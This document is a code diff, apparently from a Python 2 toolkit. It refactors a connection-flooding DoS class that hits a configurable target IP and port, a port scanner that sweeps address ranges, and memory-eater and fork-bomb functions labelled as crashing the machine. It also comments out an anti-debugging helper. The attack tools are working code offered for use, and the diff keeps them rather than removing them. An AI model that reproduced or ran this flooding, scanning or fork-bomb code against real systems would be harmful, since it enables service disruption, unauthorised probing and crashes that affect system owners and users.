@@ -29,23 +29,19 @@ DoS.update({"salvo_size" : 100,
 "display_latency" : False,
 "display_progress" : False})
 
-def trace_function(frame, instruction, args):
+
+"""def trace_function(frame, instruction, args):
     pass
 
 @contextmanager
 def resist_debugging():
     sys.settrace(trace_function)
     yield
-    sys.settrace(None)
+    sys.settrace(None)"""
 
     
 class Null_Connection(network.Tcp_Client):
     
-    defaults = defaults.Tcp_Client.copy()
-    
-    def __init__(self, **kwargs):
-        super(Null_Connection, self).__init__(**kwargs)
-        
     def on_connect(self):
         self.delete()        
             
@@ -56,16 +52,11 @@ class DoS(vmlibrary.Process):
 
     def __init__(self, **kwargs):
         super(DoS, self).__init__(**kwargs)
-        self.latency = Latency(name="Salvo size: %i" % self.salvo_size)
-
-    def run(self):
-        defaults_backup = Null_Connection.defaults.copy()
-        Null_Connection.defaults.update({"target" : self.target,
-                                         "ip" : self.ip,
-                                         "port" : self.port,
-                                         "timeout_notify" : self.timeout_notify,
-                                         "bad_target_verbosity" : 'v'})
-                                         
+        self.latency = Latency(name="Salvo size: {}".format(self.salvo_size))
+        self.options = {"target" : self.target,
+                        "ip" : self.ip,
+                        "port" : self.port}
+    def run(self):                                         
         if self.display_progress:
             self.count += 1
             print "Launched {0} connections".format(self.count * self.salvo_size)
@@ -74,14 +65,16 @@ class DoS(vmlibrary.Process):
             #print "launching salvo: {0} connections per second ({1} connections attempted)".format(self.latency.average.meta_average, (self.count * self.salvo_size))
             self.latency.update()
             self.latency.display()
-        
+            
+        options = self.options
+        backup = Null_Connection.defaults.copy()
+        Null_Connection.defaults.update(options)
         for connection_number in xrange(self.salvo_size):
-            self.create(Null_Connection)
-        Null_Connection.defaults = defaults_backup
-        
+            self.create(Null_Connection)        
         self.run_instruction.execute(self.priority)
-
-
+        Null_Connection.defaults.update(backup)
+        
+        
 class Tcp_Port_Tester(network.Tcp_Client):
     
     def on_connect(self):
@@ -138,8 +131,8 @@ class Scanner(vmlibrary.Process):
                 for field_two in xrange(subnet_two, subnet_two_range + 1):
                     for field_three in xrange(subnet_three, subnet_three_range + 1):
                         address = ".".join((str(field_zero), str(field_one), str(field_two), str(field_three)))
-                        for port in ports:
-                            print "Scanning: ", (address, port)
+                        self.alert("Scanning address: {}", [address], level='v')
+                        for port in ports:                            
                             self.create(Tcp_Port_Tester, target=(address, port), 
                                         verbosity=self.discovery_verbosity)
                             yield_interval -= 1
@@ -150,11 +143,11 @@ class Scanner(vmlibrary.Process):
 
             
 # warning: these will crash/freeze your machine
-a_list = [''.join(chr(x) for x in xrange(128))]
-def memory_eater(_list):
+def memory_eater():
+    a_list = [''.join(chr(x) for x in xrange(128))]
     while True:
         try:
-            _list.extend(x * 8 for x in _list)
+            a_list.extend(x * 8 for x in a_list)
         except:
             pass
             
@@ -171,4 +164,4 @@ def fork_bomb(eat_memory=True):
     while True:
         spawn().start()
         if eat_memory:
-            memory_eater(a_list)
+            memory_eater()
